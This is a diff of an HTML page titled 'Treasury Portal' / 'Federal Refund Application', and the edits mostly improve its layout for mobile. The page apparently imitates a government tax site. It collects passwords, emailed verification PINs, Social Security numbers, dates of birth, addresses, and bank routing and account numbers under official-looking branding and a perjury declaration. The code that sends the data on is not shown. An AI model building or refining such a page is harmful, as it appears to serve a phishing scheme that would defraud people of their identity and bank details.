@@ -9,18 +9,18 @@
     <link rel="stylesheet" href="styles.css">
     <link rel="stylesheet" href="tax.css">
     <style>
-        /* Enhanced UI elements for Government Feel */
+        /* Base Government Feel */
         .official-seal-bg { background-color: #f8f9fa; border-left: 5px solid #002868; }
         .error-border { border: 2px solid #dc3545 !important; }
         .success-text { color: #28a745; font-weight: bold; }
 
-        /* User-facing error message styling */
+        /* Professional UI Error Messages - No more alerts for users */
         .ui-error-message {
-            color: #dc3545;
-            background-color: #fce8e8;
-            border: 1px solid #f5c2c7;
+            color: #721c24;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
             padding: 12px;
-            border-radius: 4px;
+            border-radius: 6px;
             margin-bottom: 15px;
             font-size: 0.9rem;
             display: none;
@@ -28,359 +28,381 @@
             text-align: left;
         }
 
-        /* Session Display Styling at Top Fixed Bar */
+        /* Top Fixed Bar Responsiveness */
         .top-email-bar {
             background-color: #002868;
             color: white;
-            padding: 10px 20px;
+            padding: 10px 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            font-size: 0.85rem;
+            font-size: 0.75rem;
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             z-index: 2000;
             box-shadow: 0 2px 5px rgba(0,0,0,0.2);
-            font-family: sans-serif;
+            height: 50px;
         }
 
         #user-session-display {
-            display: none; /* Controlled by tax.js */
+            display: none;
             background: rgba(255,255,255,0.1);
-            padding: 5px 12px;
+            padding: 4px 8px;
             border-radius: 4px;
-            border: 1px solid rgba(255,255,255,0.2);
             align-items: center;
+            overflow: hidden;
+            max-width: 60%;
         }
         
+        #session-email-text {
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            display: inline-block;
+            max-width: 100px;
+        }
+
         .status-dot {
             display: inline-block;
             width: 8px;
             height: 8px;
             background: #28a745;
             border-radius: 50%;
-            margin-right: 8px;
-            box-shadow: 0 0 5px rgba(40, 167, 69, 0.5);
+            margin-right: 5px;
+            flex-shrink: 0;
         }
 
-        /* Professional 6-digit individual lines for PIN entry */
+        /* Exactly 6 PIN lines styling - Professional individual dashes */
         .pin-input-container {
             position: relative;
-            margin: 25px 0;
-            text-align: center;
+            margin: 20px 0;
             display: flex;
             justify-content: center;
+            width: 100%;
         }
         .styled-pin-input {
             font-family: 'Courier New', Courier, monospace;
-            font-size: 2.5rem;
-            letter-spacing: 23px; /* Spacing to align with 6 dashes */
+            font-size: 2.2rem;
+            letter-spacing: 21px; /* Precision spacing for 6 digits */
             text-align: left;
-            padding-left: 15px;
+            padding-left: 12px;
             border: none;
-            /* Creates exactly 6 distinct underscores */
-            background-image: linear-gradient(to right, #002868 70%, rgba(255, 255, 255, 0) 0%);
-            background-position: bottom;
-            background-size: 45px 3px;
-            background-repeat: repeat-x;
+            /* Creates exactly 6 distinct segments (30px line, 11px gap) */
+            background: repeating-linear-gradient(90deg, 
+                #002868 0, #002868 30px, 
+                transparent 30px, transparent 41px) 0 100% / 246px 3px no-repeat;
             color: #002868;
-            width: 270px; /* 6 * 45px */
-            height: 60px;
+            width: 246px; 
+            height: 55px;
             margin: 0 auto;
             display: block;
             outline: none;
-            background-position-x: 0;
+            background-position: bottom left;
         }
 
-        /* Fixed Logout Button Styling */
-        #btn-logout-top {
-            background: #fff !important;
-            color: #dc3545 !important;
-            border: 1px solid #dc3545 !important;
-            padding: 4px 10px;
-            border-radius: 3px;
-            cursor: pointer;
-            font-size: 0.75rem;
-            margin-left: 10px;
-            font-weight: bold;
-            text-decoration: none;
+        /* Mobile-First Responsiveness Overrides */
+        body { 
+            padding-top: 60px; 
+            margin: 0; 
+            background: #f4f7f9; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
-        #btn-logout-top:hover { 
-            background: #dc3545 !important; 
-            color: #fff !important; 
+        
+        .form-container {
+            width: 92%;
+            max-width: 800px;
+            margin: 10px auto;
+            padding: 20px 15px;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            box-sizing: border-box;
         }
 
-        /* Adjust main container for fixed top bar */
-        body { padding-top: 60px; }
+        .modal-content {
+            width: 90% !important;
+            max-width: 400px;
+            padding: 25px !important;
+            border-radius: 15px !important;
+            box-sizing: border-box;
+        }
+
+        .btn-group {
+            display: flex;
+            flex-direction: column-reverse; /* Stack buttons on mobile for easier reach */
+            gap: 12px;
+            margin-top: 25px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 14px;
+            font-size: 1rem;
+            border-radius: 8px;
+            font-weight: 600;
+        }
+
+        @media (min-width: 600px) {
+            .btn-group { flex-direction: row; justify-content: space-between; }
+            .btn-group .btn { width: auto; min-width: 120px; }
+            .top-email-bar { font-size: 0.85rem; padding: 10px 20px; }
+            #session-email-text { max-width: none; }
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 0.95rem;
+        }
+
+        input[type="text"], 
+        input[type="email"], 
+        input[type="password"], 
+        input[type="tel"], 
+        input[type="number"],
+        select {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+            appearance: none;
+            background-color: #fff;
+        }
+
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+        }
+        
+        .radio-group label {
+            margin-bottom: 0;
+            font-weight: normal;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
 
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
-
-        @media (max-width: 480px) {
-            input::placeholder { font-size: 1rem; }
+        
+        .security-note {
+            font-size: 0.8rem;
+            color: #666;
+            background: #fff8e1;
+            padding: 10px;
+            border-radius: 6px;
+            border-left: 4px solid #ffc107;
+            margin-bottom: 15px;
         }
     </style>
 </head>
 <body>
 
 <div class="top-email-bar">
-    <div>🏛️ FEDERAL TAX PORTAL</div>
+    <div style="font-weight: bold; letter-spacing: 0.5px;">🏛️ TREASURY PORTAL</div>
     <div id="user-session-display">
         <span class="status-dot"></span>
         <span id="session-email-text"></span>
-        <button id="btn-logout-top" onclick="window.Auth.logout()">Sign Out</button>
+        <button id="btn-logout-top" onclick="window.Auth.logout()" style="background:#fff; color:#d9534f; border:1px solid #d9534f; padding:3px 8px; font-size:10px; cursor:pointer; border-radius:4px; font-weight:bold; margin-left:10px;">SIGN OUT</button>
     </div>
 </div>
 
 <div class="form-container" role="main">
-    <div id="auth-controls" style="text-align:center; margin-bottom:20px; padding:20px; background:#f1f3f5; border-radius:10px; border: 1px solid #dee2e6;">
-        <p style="font-size:0.7rem; margin-bottom:12px; color:#6c757d; letter-spacing: 1px; font-weight: bold;">SECURE GOVERNMENT ACCESS PORTAL</p>
-        <div id="auth-buttons-initial">
-            <button id="btn-show-login" class="btn btn-secondary" style="display:inline-block; margin-right:8px;">Portal Login</button>
-            <button id="btn-show-register" class="btn btn-primary" style="display:inline-block;">Create Secure Account</button>
+    <div id="auth-controls" style="text-align:center; margin-bottom:25px; padding:20px; background:#f1f3f5; border-radius:12px; border: 1px solid #dee2e6;">
+        <p style="font-size:0.7rem; margin-bottom:12px; color:#6c757d; font-weight: 800; text-transform: uppercase; letter-spacing: 1px;">Secure Government Access</p>
+        <div id="auth-buttons-initial" style="display: flex; gap: 10px; justify-content: center;">
+            <button id="btn-show-login" class="btn btn-secondary" style="flex: 1;">Sign In</button>
+            <button id="btn-show-register" class="btn btn-primary" style="flex: 1;">Create ID</button>
         </div>
     </div>
 
-    <div id="auth-modal" class="modal" aria-hidden="true" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; align-items:center; justify-content:center;">
-        <div class="modal-content" role="dialog" aria-modal="true" aria-labelledby="auth-title" style="background:white; padding:30px; border-radius:10px; width:90%; max-width:450px; box-shadow: 0 5px 30px rgba(0,0,0,0.5);">
-            <h3 id="auth-title" style="color:#002868; border-bottom:1px solid #ddd; padding-bottom:10px;">Security Access</h3>
+    <div id="auth-modal" class="modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; align-items:center; justify-content:center;">
+        <div class="modal-content" style="background:white; border-radius:15px; box-shadow: 0 10px 40px rgba(0,0,0,0.4);">
+            <h3 id="auth-title" style="color:#002868; margin-top:0; border-bottom: 2px solid #f1f3f5; padding-bottom: 15px; margin-bottom: 20px;">Identity Verification</h3>
             
             <div id="auth-forms">
+                <!-- Registration -->
                 <form id="register-form" style="display:none;">
                     <div id="register-error" class="ui-error-message"></div>
-                    <p style="font-size:0.8rem; color:#666;">Note: Password must be at least 8 characters.</p>
-                    <label for="reg-email">Email (Username)</label>
-                    <input id="reg-email" type="email" required placeholder="name@example.com" />
+                    <label>Email Address</label>
+                    <input id="reg-email" type="email" placeholder="name@example.com" required />
                     
-                    <label for="reg-password" style="font-weight:bold; color:#002868;">SET PASSWORD</label>
-                    <input id="reg-password" type="password" placeholder="Min 8 characters" minlength="8" required />
+                    <label>Secure Password (Min 8 Chars)</label>
+                    <input id="reg-password" type="password" minlength="8" placeholder="Enter at least 8 characters" required />
                     
-                    <label for="reg-name">Legal Full Name</label>
-                    <input id="reg-name" type="text" required />
+                    <label>Full Legal Name</label>
+                    <input id="reg-name" type="text" placeholder="As on SSN card" required />
                     
-                    <label for="reg-dob">Date of Birth (MM/DD/YYYY)</label>
+                    <label>Date of Birth</label>
                     <input id="reg-dob" type="text" placeholder="MM/DD/YYYY" maxlength="10" required />
                     
-                    <div style="margin-top:15px; display:flex; gap:10px;">
-                        <button id="btn-register" class="btn btn-primary" type="button">Register ID</button>
+                    <div style="margin-top:10px;">
+                        <button id="btn-register" class="btn btn-primary" type="button" style="margin-bottom: 10px;">Register Account</button>
                         <button id="btn-cancel-auth" class="btn btn-secondary" type="button">Cancel</button>
                     </div>
                 </form>
 
+                <!-- Login -->
                 <form id="login-form" style="display:none;">
                     <div id="login-error" class="ui-error-message"></div>
-                    <label for="login-email">Authorized Email</label>
-                    <input id="login-email" type="email" required />
+                    <label>Authorized Email</label>
+                    <input id="login-email" type="email" placeholder="name@example.com" required />
                     
-                    <label for="login-password" style="font-weight:bold; color:#002868;">PASSWORD</label>
-                    <input id="login-password" type="password" minlength="8" required />
+                    <label>Password</label>
+                    <input id="login-password" type="password" placeholder="Min 8 characters" required />
                     
-                    <div style="margin-top:8px; text-align:right;">
-                        <a href="#" id="forgot-link" style="font-size:0.85rem; color:#0056b3;">Forgot secure password?</a>
+                    <div style="text-align:right; margin: -5px 0 15px 0;">
+                        <a href="#" id="forgot-link" style="font-size:0.85rem; color:#0056b3; font-weight: 500;">Forgot Secure Password?</a>
                     </div>
                     
-                    <div style="margin-top:15px; display:flex; gap:10px;">
-                        <button id="btn-login" class="btn btn-primary" type="button">Sign In</button>
+                    <div>
+                        <button id="btn-login" class="btn btn-primary" type="button" style="margin-bottom: 10px;">Sign In</button>
                         <button id="btn-cancel-login" class="btn btn-secondary" type="button">Cancel</button>
                     </div>
                 </form>
 
+                <!-- Forgot -->
                 <form id="forgot-form" style="display:none;">
                     <div id="forgot-error" class="ui-error-message"></div>
-                    <p>A 6-digit verification code will be sent to your email.</p>
-                    <label for="forgot-email">Recovery Email</label>
-                    <input id="forgot-email" type="email" required />
-                    <div style="margin-top:15px; display:flex; gap:10px;">
-                        <button id="btn-forgot-send" class="btn btn-primary" type="button">Send Code</button>
+                    <p style="font-size:0.9rem; color: #555; line-height: 1.4; margin-bottom: 20px;">Enter your registered email. A 6-digit recovery code will be dispatched to your inbox.</p>
+                    <input id="forgot-email" type="email" placeholder="name@example.com" required />
+                    <div style="margin-top:10px;">
+                        <button id="btn-forgot-send" class="btn btn-primary" type="button" style="margin-bottom: 10px;">Send Recovery Code</button>
                         <button id="btn-forgot-cancel" class="btn btn-secondary" type="button">Cancel</button>
                     </div>
                 </form>
 
+                <!-- Reset -->
                 <form id="reset-form" style="display:none;">
                     <div id="reset-error" class="ui-error-message"></div>
-                    <label for="reset-email">Email</label>
-                    <input id="reset-email" type="email" readonly />
-                    
+                    <label>6-Digit Verification Code</label>
                     <div class="pin-input-container">
-                        <label style="display:block; margin-bottom:10px; font-weight:bold; color:#002868;">6-DIGIT VERIFICATION PIN</label>
-                        <input id="reset-code" type="text" class="styled-pin-input" inputmode="numeric" maxlength="6" autocomplete="off" placeholder="" />
+                        <input id="reset-code" type="text" class="styled-pin-input" maxlength="6" inputmode="numeric" placeholder="------" />
                     </div>
-
-                    <label for="reset-password" style="font-weight:bold; color:#002868;">NEW PASSWORD</label>
-                    <input id="reset-password" type="password" placeholder="Min 8 characters" minlength="8" required />
-                    
-                    <div style="margin-top:15px; display:flex; gap:10px;">
-                        <button id="btn-reset-submit" class="btn btn-primary" type="button">Reset Password</button>
+                    <label>New Secure Password (8+ Chars)</label>
+                    <input id="reset-password" type="password" minlength="8" placeholder="Enter new password" required />
+                    <div style="margin-top:10px;">
+                        <button id="btn-reset-submit" class="btn btn-primary" type="button" style="margin-bottom: 10px;">Update Credentials</button>
                         <button id="btn-reset-cancel" class="btn btn-secondary" type="button">Cancel</button>
                     </div>
                 </form>
 
+                <!-- MFA -->
                 <form id="mfa-form" style="display:none; text-align:center;">
                     <div id="mfa-error-msg" class="ui-error-message"></div>
-                    <div style="background:#f0f7ff; padding:15px; border-radius:5px; margin-bottom:15px;">
-                        <p style="font-size:0.9rem; color:#2c3e50;">Enter the 6-digit PIN sent to your email.</p>
-                    </div>
+                    <p style="font-size:0.9rem; background:#e3f2fd; padding:15px; border-radius:8px; color: #0d47a1; margin-bottom: 20px;">Identity challenge: Enter the 6-digit PIN sent to your email to authorize this session.</p>
                     <div class="pin-input-container">
-                        <label style="display:block; margin-bottom:10px; font-weight:bold; color:#002868;">SECURE PIN ENTRY</label>
-                        <input id="mfa-code" type="text" class="styled-pin-input" inputmode="numeric" maxlength="6" placeholder="" />
+                        <input id="mfa-code" type="text" class="styled-pin-input" maxlength="6" inputmode="numeric" placeholder="------" />
                     </div>
-                    <div style="margin-top:15px;">
-                        <button id="btn-verify-mfa" class="btn btn-primary" type="button" style="width:100%; height:50px; font-size:1.1rem;">Validate PIN</button>
-                    </div>
+                    <button id="btn-verify-mfa" class="btn btn-primary" type="button" style="width:100%; height:55px; margin-top:15px; font-size: 1.1rem;">Validate Session PIN</button>
                 </form>
             </div>
         </div>
     </div>
 
-    <h2 id="portal-title">Federal Refund Disbursement Application</h2>
+    <h2 id="portal-title" style="font-size:1.4rem; color:#002868; text-align:center; margin-bottom: 10px;">Federal Refund Application</h2>
 
-    <div class="step-indicator" role="tablist" id="progress-bar">
-        <div class="step active" data-step="1">1. Selection</div>
-        <div class="step" data-step="2">2. Identity</div>
-        <div class="step" data-step="3">3. Financials</div>
-        <div class="step" data-step="4">4. Banking</div>
-        <div class="step" data-step="5">5. Audit</div>
+    <div class="step-indicator" id="progress-bar" style="margin-bottom:25px;">
+        <div style="font-size:0.8rem; text-align:center; color:#666; font-weight: 600;">Processing: Step <span id="current-step-num">1</span> of 5</div>
+        <div style="width: 100%; background: #eee; height: 6px; border-radius: 3px; margin-top: 8px; overflow: hidden;">
+            <div id="progress-fill" style="width: 20%; background: #002868; height: 100%; transition: width 0.3s ease;"></div>
+        </div>
     </div>
 
     <form id="refund-form" novalidate>
         <div id="refund-error" class="ui-error-message"></div>
-        <!-- STEP 1: Selection -->
+        
+        <!-- STEP 1: Filing -->
         <div class="step-content active" data-step="1">
-            <div class="form-group official-seal-bg" style="padding:15px;">
-                <label for="tax-year">Select Tax Filing Period *</label>
-                <select id="tax-year" name="taxYear" required>
-                    <option value="">Choose Year...</option>
-                    <option value="2026">Tax Year 2026 (Current)</option>
-                    <option value="2025">Tax Year 2025 </option>
-                    <option value="2024">Tax Year 2024 </option>
+            <div class="form-group official-seal-bg" style="padding:15px; border-radius:8px; border-left-width: 6px;">
+                <label>Tax Filing Period *</label>
+                <select id="tax-year" required>
+                    <option value="">Select Reporting Year...</option>
+                    <option value="2024">Tax Year 2024 (Current)</option>
                     <option value="2023">Tax Year 2023</option>
                     <option value="2022">Tax Year 2022</option>
-                    <option value="2021">Tax Year 2021</option>
-                    <option value="2020">Tax Year 2020</option>
                 </select>
             </div>
-            <div class="form-group">
+            <div class="form-group" style="margin-top:20px;">
                 <label>Filing Category *</label>
                 <div class="radio-group">
-                    <input type="radio" name="filing-status" value="single" id="single" required>
-                    <label for="single">Single</label>
-                    <input type="radio" name="filing-status" value="married-joint" id="married-joint">
-                    <label for="married-joint">Married Jointly</label>
-                    <input type="radio" name="filing-status" value="head-household" id="head-household">
-                    <label for="head-household">Head of Household</label>
+                    <label><input type="radio" name="filing-status" value="single" required> <span>Single Individual</span></label>
+                    <label><input type="radio" name="filing-status" value="married" required> <span>Married (Joint Filing)</span></label>
+                    <label><input type="radio" name="filing-status" value="hoh" required> <span>Head of Household</span></label>
                 </div>
             </div>
         </div>
 
         <!-- STEP 2: Identity -->
         <div class="step-content" data-step="2" style="display:none;">
-            <p class="security-note">Sensitive identity fields are masked for your protection. Ensure accuracy to avoid audit delays.</p>
-            <div class="form-group">
-                <label for="full-name">Full Legal Name *</label>
-                <input type="text" id="full-name" name="fullName" placeholder="As shown on SSN Card" required>
-            </div>
-            <div class="form-group">
-                <label for="email">Primary Email Address *</label>
-                <input type="email" id="email" name="email" placeholder="email@example.com" required>
-            </div>
-            <div class="form-group">
-                <label for="phone">Phone Contact (Optional)</label>
-                <input type="tel" id="phone" name="phone" placeholder="555-555-5555" maxlength="12">
-            </div>
-            <div class="form-group">
-                <label for="dob-main">Date of Birth * (MM/DD/YYYY)</label>
-                <input type="text" id="dob-main" name="dob" placeholder="MM/DD/YYYY" maxlength="10" required>
-            </div>
-            <div class="form-group">
-                <label for="ssn">Social Security Number (9 Digits) *</label>
-                <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
-            </div>
-            <div class="form-group">
-                <label for="address">Primary Residential Address *</label>
-                <input type="text" id="address" name="address" required>
-            </div>
+            <p class="security-note">Sensitive identity fields. Ensure details match your official SSN records precisely.</p>
+            <label>Legal Full Name *</label>
+            <input type="text" id="full-name" placeholder="First Middle Last" required />
+            <label>SSN (9-Digits) *</label>
+            <input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required />
+            <label>Primary Residential Address *</label>
+            <input type="text" id="address" placeholder="123 Treasury Lane, DC" required />
+            <label>Contact Phone</label>
+            <input type="tel" id="phone" placeholder="555-0199" />
         </div>
 
         <!-- STEP 3: Financials -->
         <div class="step-content" data-step="3" style="display:none;">
-            <div class="form-group">
-                <label for="gross-income">Adjusted Gross Income (AGI) *</label>
-                <input type="number" id="gross-income" name="grossIncome" placeholder="Ex: 45000" min="0" required>
-            </div>
-            <div class="form-group">
-                <label for="tax-withheld">Federal Income Tax Withheld *</label>
-                <input type="number" id="tax-withheld" name="taxWithheld" placeholder="Ex: 5000" min="0" required>
-            </div>
-            <div class="form-group">
-                <label>Dependents Declaration *</label>
-                <div class="radio-group">
-                    <input type="radio" name="dependents" value="yes" id="dep-yes" required>
-                    <label for="dep-yes">Yes</label>
-                    <input type="radio" name="dependents" value="no" id="dep-no">
-                    <label for="dep-no">No</label>
-                </div>
-            </div>
-            <div class="form-group" id="dep-count-box" style="display:none;">
-                <label for="dependents-count">Number of Qualifying Dependents:</label>
-                <input type="number" id="dependents-count" name="dependentsCount" value="0" min="0" max="15">
-            </div>
-            <div class="form-group">
-                <label for="document-upload">Attach W-2 / 1099 Forms (PDF/JPG)</label>
-                <input type="file" id="document-upload" name="documentUpload" accept=".pdf,.jpg,.jpeg">
-            </div>
+            <label>Adjusted Gross Income (AGI) *</label>
+            <input type="number" id="gross-income" placeholder="Total reported income" required />
+            <label>Federal Tax Withheld *</label>
+            <input type="number" id="tax-withheld" placeholder="Total withheld per W-2/1099" required />
+            <label>Dependents Count</label>
+            <input type="number" id="dep-count" value="0" min="0" />
         </div>
 
         <!-- STEP 4: Banking -->
         <div class="step-content" data-step="4" style="display:none;">
-            <h3 style="color:#002868;">Electronic Funds Transfer (EFT)</h3>
-            <div class="form-group">
-                <label for="bank-name">Financial Institution Name *</label>
-                <input type="text" id="bank-name" name="bankName" required>
-            </div>
-            <div class="form-group">
-                <label for="routing-number">9-Digit Routing Number *</label>
-                <input type="text" id="routing-number" name="routingNumber" maxlength="9" required>
-            </div>
-            <div class="form-group">
-                <label for="account-number">Personal Account Number *</label>
-                <input type="text" id="account-number" name="accountNumber" maxlength="17" required>
-            </div>
+            <h3 style="font-size: 1.1rem; color: #002868; margin-top: 0;">EFT Disbursement Details</h3>
+            <label>Financial Institution Name *</label>
+            <input type="text" id="bank-name" placeholder="e.g. Chase, BofA" required />
+            <label>9-Digit Routing Number *</label>
+            <input type="text" id="routing-number" placeholder="Enter routing number" maxlength="9" required />
+            <label>Personal Account Number *</label>
+            <input type="text" id="account-number" placeholder="Enter account number" required />
         </div>
 
-        <!-- STEP 5: Audit/Review -->
+        <!-- STEP 5: Audit -->
         <div class="step-content" data-step="5" style="display:none;">
-            <h3 style="color:#002868;">Final Review of Application</h3>
-            <div class="review-data" id="review-summary" style="padding:20px; background:#f0f7ff; border:1px solid #002868; border-radius:8px;">
-                <p><strong>Primary Taxpayer:</strong> <span id="review-name"></span></p>
-                <p><strong>Calculated Year:</strong> <span id="review-year"></span></p>
-                <p><strong>Gross Earnings:</strong> $<span id="review-income"></span></p>
-                <p><strong>Withholding Total:</strong> $<span id="review-withheld"></span></p>
-                <p><strong>Dependency Count:</strong> <span id="review-dependents"></span></p>
+            <h3 style="font-size: 1.1rem; color: #002868; margin-top: 0;">Review & Declaration</h3>
+            <div id="review-summary" style="padding:15px; background:#f0f4f8; border:1px solid #d1d9e6; border-radius:10px; font-size:0.95rem; line-height: 1.6;">
+                <!-- Dynamically Populated -->
             </div>
-
-            <div class="form-group" style="margin-top:25px;">
-                <input type="checkbox" id="consent" name="consent" required>
-                <label for="consent" style="display:inline; font-size:0.9rem;">I declare under penalty of perjury that this application is true and complete to the best of my knowledge.</label>
+            <div style="margin-top:20px; background: #fffbe6; padding: 12px; border: 1px solid #ffe58f; border-radius: 8px;">
+                <label style="display:flex; align-items: flex-start; gap: 10px; cursor: pointer; margin: 0;">
+                    <input type="checkbox" id="consent" style="margin-top: 4px;" required /> 
+                    <span style="font-size: 0.85rem; color: #856404;">I declare under penalty of perjury that the information provided is accurate and complete to my knowledge.</span>
+                </label>
             </div>
         </div>
 
-        <div class="btn-group" style="margin-top:30px; display:flex; justify-content:space-between;">
-            <button type="button" class="btn btn-secondary" id="prevBtn" disabled>Back</button>
-            <button type="button" class="btn btn-primary" id="nextBtn">Continue</button>
-            <button type="submit" class="btn btn-success" id="submitBtn" style="display:none;">Submit Official Application</button>
+        <div class="btn-group">
+            <button type="button" class="btn btn-secondary" id="prevBtn" disabled>Return</button>
+            <button type="button" class="btn btn-primary" id="nextBtn">Continue Application</button>
+            <button type="submit" class="btn btn-success" id="submitBtn" style="display:none; background-color: #28a745; color: white; border: none;">Submit Official Application</button>
         </div>
     </form>
 
-    <div id="final-results-page" style="display:none; text-align:center; padding:40px;">
-        <div style="font-size: 80px; color: #28a745;">✓</div>
-        <h2 style="color:#002868;">Submission Received</h2>
-        <div style="background:#eef9f0; padding:20px; border-radius:15px; margin:20px 0; border:2px dashed #28a745;">
-            <p>Estimated Refund Amount:</p>
-            <h1 style="font-size:3.5rem; color:#28a745;">$<span id="display-refund-amount">0.00</span></h1>
-        </div>
-        <p><strong>Application Ref:</strong> <span id="display-app-id"></span></p>
-        <button onclick="window.location.reload()" class="btn btn-primary">Return to Portal Home</button>
+    <div id="final-results-page" style="display:none; text-align:center; padding:40px 20px;">
+        <div style="font-size:70px; color:#28a745; margin-bottom: 20px;">✓</div>
+        <h2 style="color:#002868; margin-top: 0;">Application Filed</h2>
+        <p style="color: #555; line-height: 1.5; margin-bottom: 30px;">Your tax disbursement application has been successfully submitted to the treasury portal. You will receive an email confirmation shortly.</p>
+        <button onclick="window.location.reload()" class="btn btn-primary">Return to Homepage</button>
     </div>
 </div>
 
